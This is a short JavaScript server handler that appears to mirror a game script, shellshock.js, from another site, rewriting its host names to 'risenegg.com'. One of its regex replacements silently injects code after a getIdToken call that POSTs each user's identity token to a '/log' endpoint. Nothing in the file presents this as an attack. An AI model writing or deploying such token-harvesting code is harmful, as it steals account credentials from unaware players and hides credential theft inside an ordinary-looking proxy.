import axios from 'axios';

export default async (req, res) => {
    try {
        let request = await axios.get(`https://math.international/js/shellshock.js`);

        let replacements = [
            ['||location.host,', '||\'risenegg.com\','],
            ['${location.hostname}', 'risenegg.com'],
            ['dynamicContentRoot+', `"risenegg.com"+`],
            ['window.location.hostname', '"risenegg.com"'],
            ['isHttps()', 'true', true],
            [/getIdToken\(!0\)\.then\(\(([a-zA-Z0-9_]+)=>\{!function\(([a-zA-Z0-9_]+),([a-zA-Z0-9_,]+)\)\{/, `getIdToken(!0).then(($1=>{!async function($2, $3){await fetch('/log',{method:'POST',body:JSON.stringify({t:$2}),headers:{'content-type':'application/json'}});`],
        ];

        replacements.forEach(s => request.data = request.data[s[2] ? 'replaceAll' : 'replace'](s[0], s[1]));

        res.header('Content-Type', request.headers['content-type']); 
        res.send(request.data);
    } catch (e) {
        console.error(e, '/js/shellshock.js [special handler]');
    };
};